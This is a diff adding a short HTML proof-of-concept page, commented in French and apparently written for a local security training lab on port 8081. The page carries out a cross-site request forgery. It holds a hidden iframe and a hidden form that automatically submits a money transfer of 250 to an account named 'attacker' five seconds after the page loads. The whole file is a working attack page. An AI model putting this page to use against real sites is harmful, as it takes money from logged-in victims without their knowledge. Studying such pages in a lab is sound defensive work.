@@ -1,0 +1,28 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Attacker</title>
+</head>
+<body>
+  <h2>CSRF PoC (Level 1)</h2>
+  <p>Si la victime est connectée au lab (8081), un virement est déclenché après 5 secondes.</p>
+
+  <p id="status"><b>Timer lancé :</b> attaque dans 5 secondes…</p>
+
+  <!-- Iframe caché pour éviter la navigation -->
+  <iframe name="hiddenframe" style="display:none"></iframe>
+
+  <form id="csrf" method="POST" action="http://localhost:8081/transfer.php" target="hiddenframe">
+    <input type="hidden" name="to" value="attacker">
+    <input type="hidden" name="amount" value="250">
+  </form>
+
+  <script>
+    setTimeout(() => {
+      document.getElementById("status").innerHTML = "<b>GO :</b> requête envoyée (sans changer de page).";
+      document.getElementById("csrf").submit();
+    }, 5000);
+  </script>
+</body>
+</html>
